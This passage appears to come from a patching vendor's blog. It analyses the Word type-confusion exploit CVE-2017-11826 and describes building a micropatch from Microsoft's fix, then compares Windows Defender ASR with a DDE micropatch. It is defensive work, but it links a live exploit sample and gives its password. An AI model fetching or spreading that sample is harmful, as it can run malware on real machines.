Once we got the [exploit file](https://drive.google.com/file/d/0B8AlLxKo4rqLQmd1eXpZcVByUGc/view)\* we could start the analysis. We first minimized the exploit file by removing unnecessary payload and effectively turning it into a crash PoC. Turning a working exploit (one that reliably executes malicious code) into a crash case is an important step for us because in contrast to malware analysts, we're not interested in what malware does when it gets control, but only **how** it gets control. Making an exploit crash instead of execute its code generally leads us closer to the vulnerability that gets exploited - and closer to writing a patch for it. It's also easier to test a patch, once you have one, with a simple and quick test case.

\* Exercise caution with this exploit file - it may run malware on your computer. (Password is *aiongnostes1004*.)

**Analysis**

Opening the crash PoC in Word 2010 crashes immediately with a call to an illegal address:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikv-bbHpITSu68hekai0K0MAnL6V30m3A461d6Dw8yzNXPQyxuMC1QuXTleIxgVW4Summu9xtTGLJFpwccg_ZSQIr_qyQiqNjfs-t4JFXRYbvmdU9rkr8ygHEbz2ix5UoAZ09MeXA0j0pC/s1600/windbg_crash.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikv-bbHpITSu68hekai0K0MAnL6V30m3A461d6Dw8yzNXPQyxuMC1QuXTleIxgVW4Summu9xtTGLJFpwccg_ZSQIr_qyQiqNjfs-t4JFXRYbvmdU9rkr8ygHEbz2ix5UoAZ09MeXA0j0pC/s1600/windbg_crash.PNG)

This looks like a call to a vtable function, and since we already learned from Kaspersky above that we're dealing with a type confusion issue, it's likely that we're looking at a case of code processing an object of some expected type with the address at ecx+4 supposedly pointing to a valid function, while the object is actually of a different type.

Type confusion flaws are not the easiest kind to patch if you don't have the source code. While the fix is usually in the form "if type != EXPECTED\_TYPE goto GET\_OUT\_OF\_HERE", it's not trivial to figure out where the said type resides in the object without looking around the code where else the same type may be used. Once you have that figured out, it's relatively simple to determine the EXPECTED\_TYPE by observing the type value with legitimate test cases and comparing that to the value when you process the PoC. Finding a suitable GET\_OUT\_OF\_HERE location also needs some figuring out: you want the patched code to escape the flaw gracefully without leaving a corrupted state or cutting off some legitimate functionality. So sometimes this can get time consuming - but in this case, we had the official fix so we could peek into what Microsoft did to correct this flaw.

Diffing the patched wwlib.dll with the latest vulnerable one revealed very few changes. In fact, the only noteworthy change was in the exact function containing the above call that crashes. Let's look at the diff:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvuj2I1P2URHOBLIHxm2WYo1UBWnOn5uOivKkM5nViVPEzDanYlaQO4tDqJmItxuDy9K2i-Z4hOVQDmhpu_9U0N_EFTxeDfZ-uIkNF-klnRs4mzWGMOu9Zv-HAF3ZBZY7AlyoW9w3MBiS_/s640/diff_comments.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvuj2I1P2URHOBLIHxm2WYo1UBWnOn5uOivKkM5nViVPEzDanYlaQO4tDqJmItxuDy9K2i-Z4hOVQDmhpu_9U0N_EFTxeDfZ-uIkNF-klnRs4mzWGMOu9Zv-HAF3ZBZY7AlyoW9w3MBiS_/s1600/diff_comments.png)

The patched function is on the left, the vulnerable on the right (click the image to magnify). It's easy to see that the patched function introduced a branch before the grey-marked code in the vulnerable function. And it looks exactly like "if type != EXPECTED\_TYPE goto GET\_OUT\_OF\_HERE": it starts with a check for a specific value, and if there is no match, execution is diverted to some new code (marked "Safe exit code" above), which avoids the call that crashed.

The only surprise is that instead of seeing a comparison of some type variable with some type constant (usually a small number, resulting from an enum clause in the source code), we see a comparison with a function address:

cmp ds:[eax+0x48], 0x31E94A4A

Note that 0x31E94A4A is actually an address of some function in wwlib.dll, which gets stored to the address pointed to by eax+0x48 a couple of blocks earlier in the same patched function. So what Microsoft's patch seems so do is check the validity of the object not by inspecting its type (perhaps there is no type ID in the structure at all), but by inspecting the address of a function pointed to by the object. Why not - as long as it works. No one in the world knows this code better than Microsoft's developers and if they thought this was the best possible fix, they're probably right.

**Patching**

Without further analysis, we can clone the same logic to the vulnerable code. The only thing we add is the "Exploit Attempt Blocked" dialog in case the object type is found to be incorrect. And here is the result:

**What Do You Do Now?**

We wrote a CVE-2017-11826 micropatch for 32-bit Word 2010's wwlib.dll version 14.0.7182.5000. While it's generally simple, and often fully automatable, to port a micropatch to other module versions, we prefer to do that on demand for now. So if you're running any affected Office version and for any reason can't apply Microsoft's official update (yet) but would like to be protected from this highly exploitable vulnerability, do let us know at support@0patch.com. We'll port the micropatch to your version and make it available for everyone else too.

If you are a security researcher and have a non-public proof-of-concept for some vulnerability, consider either writing a micropatch for it (using [0patch Agent for Developers](https://blog.0patch.com/2017/02/one-step-closer-to-crowdpatching-and.html)) or sharing the PoC with us so we can create a micropatch together. You'll see it's almost as fun to thoroughly break someone's exploit as it is to write one ;)

### [Office DDE Exploits and Attack Surface Reduction](https://blog.0patch.com/2017/11/office-dde-exploits-and-attack-surface.html)

by Mitja Kolsek, the 0patch team

Windows 10 Fall Creators Update brought a powerful security capability: Windows Defender Exploit Guard. Among its many features and mitigations, the one that sounded most interesting to us was the Attack Surface Reduction (ASR) - especially for its announced ability to block DDE-based attacks:

> Attack Surface Reduction (ASR) in Windows Defender Exploit Guard blocks DDE-based malware <https://t.co/bUOWOZiops>
> — Microsoft MMPC (@msftmmpc) [October 31, 2017](https://twitter.com/msftmmpc/status/925153373640278016?ref_src=twsrc%5Etfw)

DDE-based attacks have been very popular lately. They are misusing a DDE-related feature whereby Office gets tricked into launching a malicious executable via a DDE or DDEAUTO field, the latter only requiring the user to confirm one non-security notice.

You may also know that [we have created a free micropatch for Word that prevents DDE fields from launching any executables](https://blog.0patch.com/2017/10/0patching-office-dde-ddeauto.html) - thereby enforcing the behavior specified in official Microsoft documentation, effectively blocking DDE attacks.

We therefore wanted to see how ASR does its magic. So we installed the Fall Creators Update and Office 2010, and followed [Microsoft's instructions](https://docs.microsoft.com/en-us/windows/threat-protection/windows-defender-exploit-guard/attack-surface-reduction-exploit-guard) to enable the "Block Office applications from creating child processes" rule. We tested how DDE-based attacks are blocked, looked around a bit to see what could go wrong, and compared the said mitigation to our micropatch.

You can see the whole process in the video below, but the main takeaways are these:

1. Most importantly, we confirmed that ASR does block DDE attacks in Word.
2. Unfortunately, ASR only applies to Word, Excel, PowerPoint and OneNote, so Outlook-based DDE attacks are not blocked. (Perhaps Outlook will be added at a later time?)
3. Also unfortunately, the ASR rule in question breaks some legitimate functionality. We found, for instance, that  it prevents Adobe Reader from being launched via Word's legitimate "Create PDF/XPS Document" functionality. There is another case (not shown in video) with Word being unable to launch "System Info" from the About dialog. Legitimate Word add-ins may want to launch processes too, and will be blocked.
4. In comparison, a real fix (in this case, our micropatch) only blocks the dangerous process-launching while leaving all other functionalities intact; it also automatically works in Outlook. Naturally, an actual code fix is always better than a generic mitigation.
5. Nevertheless, exploit mitigations have one big advantage compared to patches: they can stop or slow down attackers exploiting **unknown vulnerabilities**. A patch can only fix a known bug.

In conclusion, ASR (with all its rules) is a very powerful tool and while one must exercise caution with its blocking of potentially legitimate functionality, it can significantly limit the attacker. So by all means use it if you can, but also apply patches for known vulnerabilities!

You can't use ASR, unfortunately, on non-Windows-10 systems, or on Office 2007, which has just reached its end of support but is likely still used in many places.

Stay safe!
